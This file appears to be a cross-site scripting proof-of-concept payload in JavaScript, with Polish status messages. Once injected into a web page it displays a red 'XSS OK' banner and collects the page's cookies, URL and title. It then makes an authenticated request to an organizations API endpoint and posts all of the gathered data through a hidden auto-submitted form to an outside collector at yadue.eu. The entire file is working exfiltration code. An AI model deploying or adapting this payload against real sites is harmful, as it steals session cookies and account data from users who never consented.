(function () {
  var bar = document.createElement('div');
  bar.id = 'poc-xss';
  bar.style.cssText = 'position:fixed;z-index:2147483647;top:0;left:0;right:0;padding:10px;background:#b00020;color:#fff;font:14px monospace';
  bar.textContent = 'XSS OK @ ' + location.host + location.pathname + ' — zbieram dane...';
  document.body.appendChild(bar);
  document.documentElement.setAttribute('data-pwned', '1');

  var out = { ts: new Date().toISOString(), url: location.href, title: document.title, cookies: document.cookie };

  function send() {
    var fd = new FormData();
    fd.append('d', 'POC ' + JSON.stringify(out));
    var f = document.createElement('form');
    f.method = 'POST';
    f.action = 'https://yadue.eu/collect.php';
    f.target = '_self';
    var i = document.createElement('input');
    i.type = 'hidden'; i.name = 'd'; i.value = 'POC ' + JSON.stringify(out);
    f.appendChild(i);
    document.body.appendChild(f);
    setTimeout(function () { f.submit(); }, 1500);
  }

  fetch('/api/v1/organizations/', { credentials: 'include' })
    .then(function (r) { return r.ok ? r.json() : null; })
    .then(function (j) {
      if (j && j.results) out.orgs = j.results.map(function (o) { return o.slug + ':' + (o.name || ''); });
      bar.textContent += ' orgs=' + (out.orgs ? out.orgs.length : 'n/a') + ' — wysylam...';
      send();
    })
    .catch(function () { send(); });
})();
